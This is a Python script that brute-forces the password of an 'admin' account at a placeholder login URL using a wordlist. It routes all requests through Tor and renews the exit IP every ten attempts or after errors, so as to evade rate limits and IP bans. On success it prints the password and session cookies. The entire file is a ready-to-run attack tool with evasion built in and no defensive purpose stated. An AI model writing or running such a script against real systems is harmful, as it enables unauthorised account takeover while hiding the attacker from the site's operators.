import requests
import time
import sys
from stem import Signal
from stem.control import Controller

URL = "<URL>/login"
USER = "admin"
TOR_PORT = 9050
CTRL_PORT = 9051
WORDLIST = "passwords.txt"  # Path to your wordlist file
ROTATE_EVERY = 10  # Change IP after this many requests
proxies = {
    'http': f'socks5h://127.0.0.1:{TOR_PORT}',
    'https': f'socks5h://127.0.0.1:{TOR_PORT}'
}

def change_ip():
    try:
        with Controller.from_port(port=CTRL_PORT) as ctrl:
            ctrl.authenticate()
            ctrl.signal(Signal.NEWNYM)
            print("Tor IP renewed")
            time.sleep(ctrl.get_newnym_wait())
    except Exception as e:
        print(f"! Tor control error: {e}")
        print("! Ensure Tor is running with proper torrc config")
        sys.exit(1)

print("Starting brute-force with wordlist...")
change_ip()

try:
    with open(WORDLIST, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print(f"! Wordlist file not found: {WORDLIST}")
    sys.exit(1)

print(f"Loaded {len(passwords)} passwords from wordlist")

request_count = 0

for pwd in passwords:
    request_count += 1
    
    if request_count % ROTATE_EVERY == 0:
        print(f"\n--- {ROTATE_EVERY} requests reached, rotating IP ---")
        change_ip()
        request_count = 0

    data = {"username": USER, "password": pwd}

    try:
        r = requests.post(
            URL, 
            data=data, 
            proxies=proxies, 
            timeout=15,
            allow_redirects=False
        )

        if r.status_code != 302:
            with open('sus.txt', 'a') as f:
                f.write(f"Password: {pwd} | Status: {r.status_code} | Response: {r.text[:100]}\n")
                
        print(f"Trying: {pwd} | Status: {r.status_code}")
        
        if r.status_code == 302 and 'index' in r.text:
            print("\n" + "="*40)
            print(f"SUCCESS! Password: {pwd}")
            print(f"Redirect: {r.headers.get('location', 'N/A')}")
            print(f"Cookies: {r.cookies.get_dict()}")
            print("="*40 + "\n")
            break
            
    except requests.exceptions.RequestException as e:
        print(f"! Request failed: {e}")
        print("! Rotating IP and retrying...")
        change_ip()
        request_count = 0  # Reset counter after rotation

print("Brute-force completed")